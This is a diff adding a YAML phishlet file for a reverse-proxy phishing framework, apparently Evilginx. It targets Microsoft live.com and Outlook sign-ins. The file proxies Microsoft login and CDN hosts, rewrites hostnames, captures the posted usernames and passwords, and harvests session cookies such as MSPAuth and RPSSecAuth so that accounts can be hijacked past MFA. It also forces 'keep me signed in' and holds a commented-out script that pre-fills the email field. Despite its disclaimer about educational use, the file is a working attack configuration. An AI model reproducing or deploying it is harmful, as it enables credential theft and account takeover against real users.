@@ -1,0 +1,101 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'azwus1-client-s.gateway.messenger', orig_sub: 'azwus1-client-s.gateway.messenger', domain: 'live.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office365.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'r4.res', orig_sub: 'r4.res', domain: 'office365.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'browser.events.data', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'outlook-1.cdn', orig_sub: 'outlook-1.cdn', domain: 'office.net', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'azwus1-client-s.gateway.messenger', domain: 'live.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'azwus1-client-s.gateway.messenger', domain: 'live.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'office365.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'office365.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'r4.res', domain: 'office365.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'csp', domain: 'microsoft.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'csp', domain: 'microsoft.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'browser.events.data', domain: 'microsoft.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'browser.events.data', domain: 'microsoft.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook-1.cdn', domain: 'office.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook-1.cdn', domain: 'office.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'outlook.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'login', domain: 'live.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'azwus1-client-s.gateway.messenger', domain: 'live.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'azwus1-client-s.gateway.messenger', domain: 'live.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'office365.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'office365.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'r4.res', domain: 'office365.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'csp', domain: 'microsoft.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'csp', domain: 'microsoft.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'browser.events.data', domain: 'microsoft.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'browser.events.data', domain: 'microsoft.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook-1.cdn', domain: 'office.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook-1.cdn', domain: 'office.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['wlidperf', 'MSPAuth', 'MSPProf', 'WLSSC', 'RPSAuth', 'RPSSecAuth', 'MH', 'ANON', 'NAP', 'MUID', 'PPLState', '.*,regexp']
+    
+# https://outlook.live.com/mail/0/inbox    
+#auth_urls:
+#  - '/ppsecure/post.srf'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/ppsecure/post.srf'
+    search:
+      - {key: 'login', search: '.*'}
+      - {key: 'passwd', search: '.*'}
+      - {key: 'i13', search: '.*'}
+    force:
+      - {key: 'i13', value: '1'}
+      - {key: 'KMSI', value: 'on'}
+    type: 'post'
+
+login:
+  domain: 'login.live.com'
+  path: '/login.srf?wa=wsignin1.0&rpsnv=13&ct=1618837779&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3A%2F%2Foutlook.live.com%2Fowa%2F%3Fnlp%3D1%26RpsCsrfState%3D4024bc15-c6d2-7893-eca2-549d68ff7b95&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2Cflname%2Cwld&cobrandid=90015'
+
+#js_inject:
+#  - trigger_domains: ["login.live.com"]
+#    trigger_paths: ["/login.srf"]
+#    trigger_params: ["email"]
+#    script: |
+#      function lp(){
+#        var email = document.querySelector("#email");
+#        if (email != null && password != null) {
+#          email.value = "{email}";
+#          return;
+#        }
+#        setTimeout(function(){lp();}, 100);
+#      }
+#      setTimeout(function(){lp();}, 100);
+
